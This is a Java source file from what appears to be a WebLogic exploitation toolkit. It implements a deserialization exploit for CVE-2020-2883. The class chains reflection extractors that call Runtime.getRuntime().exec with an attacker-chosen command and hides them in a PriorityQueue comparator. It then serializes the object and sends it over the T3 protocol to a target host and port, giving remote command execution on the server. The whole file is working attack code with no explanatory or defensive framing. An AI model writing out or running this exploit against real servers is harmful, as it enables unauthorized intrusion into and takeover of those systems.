package org.weblogic.exploit;

// org.exploit from https://github.com/5up3rc/weblogic_cmd/
// com.tangosol.util.extractor.ChainedExtractor from coherence.jar

import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import org.weblogic.exploit.annotation.Gadget;
import org.weblogic.serial.Reflections;
import org.weblogic.serial.Serializer;
import org.weblogic.weblogic.T3ProtocolOperation;

import java.util.PriorityQueue;

@Gadget(cve = "CVE-2020-2883")
public class Coherence1 implements Exploit {

    public void exploit(String host, String port, String command) throws Exception {
        ReflectionExtractor[] extractors = {
                new ReflectionExtractor("getMethod", new Object[]{"getRuntime", new Class[0]}),
                new ReflectionExtractor("invoke", new Object[]{null, new Object[0]}),
                new ReflectionExtractor("exec", new Object[]{Exploit.Utils.commands(command)}),
        };
        ChainedExtractor extractor = new ChainedExtractor(extractors);
        ExtractorComparator comparator = new ExtractorComparator();
        Reflections.setFieldValue(comparator, "m_extractor", extractor);
        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, null);
        queue.add(1);
        queue.add(1);
        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = Runtime.class;
        queueArray[1] = Runtime.class;
        //add comparator for queue
        Reflections.setFieldValue(queue, "comparator", comparator);
        T3ProtocolOperation.send(host, port, Serializer.serialize(queue));
    }
}
